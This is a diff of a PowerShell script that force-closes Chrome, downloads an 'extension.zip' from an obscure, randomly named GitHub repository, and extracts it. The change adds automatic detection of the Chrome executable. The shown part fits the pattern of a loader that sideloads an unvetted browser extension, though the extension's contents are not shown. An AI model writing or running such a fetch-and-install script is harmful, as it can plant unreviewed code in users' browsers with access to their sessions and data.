@@ -2,10 +2,49 @@
 Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
 
 # ---------- CONFIG ----------
-$zipUrl     = "https://github.com/k53xupn43/i965652f/raw/refs/heads/main/extension.zip"
-$chromeExe  = "C:\Program Files\Google\Chrome\Application\chrome.exe"
-$workDir    = "C:\ExtTemp"
-$extFolder  = "$workDir\MyExtension"
+$zipUrl    = "https://github.com/k53xupn43/i965652f/raw/refs/heads/main/extension.zip"
+$workDir   = "C:\ExtTemp"
+$extFolder = "$workDir\MyExtension"
+
+# ---------- Auto-detect Chrome ----------
+$chromeExe = $null
+
+# 1) Try the PATH (portable or already on PATH)
+$chromeExe = (Get-Command chrome -ErrorAction SilentlyContinue).Source
+
+# 2) Registry: 64-bit Chrome on 64-bit Windows
+if (-not $chromeExe) {
+    $chromeExe = Get-ItemPropertyValue `
+        -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe' `
+        -Name '(default)' -ErrorAction SilentlyContinue
+}
+
+# 3) Registry: 32-bit Chrome on 64-bit Windows
+if (-not $chromeExe) {
+    $chromeExe = Get-ItemPropertyValue `
+        -Path 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe' `
+        -Name '(default)' -ErrorAction SilentlyContinue
+}
+
+# 4) Common install folders
+if (-not $chromeExe) {
+    $candidates = @(
+        "${env:ProgramFiles}\Google\Chrome\Application\chrome.exe"
+        "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe"
+        "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe"
+    )
+    foreach ($c in $candidates) {
+        if (Test-Path $c) { $chromeExe = $c; break }
+    }
+}
+
+# 5) Nothing found → abort
+if (-not $chromeExe) {
+    Write-Host "[X] Chrome executable could not be located. Install Chrome or add it to PATH." -ForegroundColor Red
+    exit 1
+}
+
+Write-Host "[i] Chrome found at: $chromeExe" -ForegroundColor Cyan
 
 # ---------- 1. Download & extract ----------
 New-Item -ItemType Directory -Path $workDir -Force | Out-Null
